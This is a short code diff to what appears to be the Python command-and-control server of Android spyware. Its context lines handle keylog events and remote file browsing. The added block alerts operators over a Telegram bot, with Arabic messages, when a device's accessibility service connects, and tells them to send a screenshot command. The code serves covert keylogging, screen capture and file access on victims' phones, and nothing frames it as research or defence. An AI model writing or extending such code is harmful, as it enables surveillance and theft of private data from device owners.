@@ -1819,6 +1819,23 @@ def _sock_file_explorer(data):
         _handle_keylog_event(dev, data)
         return
     
+    # ✅ Check for accessibility_connected event
+    if data_type == "accessibility_connected":
+        logger.info(f"✅ Accessibility connected on #{dev.get('short_id', '?')}")
+        if mdm_bot:
+            for admin_id in Config.ADMIN_IDS:
+                try:
+                    short_label = _dev_label(dev)
+                    mdm_bot.bot.send_message(admin_id,
+                        f"<b>✅ Accessibility متصل!</b>\n\n"
+                        f"📱 <b>{short_label}</b>\n"
+                        f"📸 الجهاز جاهز للقطات الشاشة\n\n"
+                        f"💡 أرسل أمر screenshot لالتقاط صورة",
+                        parse_mode="HTML")
+                except Exception as e:
+                    logger.error(f"فشل إرسال إشعار accessibility: {e}")
+        return
+    
     cmd = data.get("command", "?")
     status = data.get("status", "?")
     logger.info(f"[Socket] استكشاف ملفات: #{dev.get('short_id', '?')} cmd={cmd} status={status}")
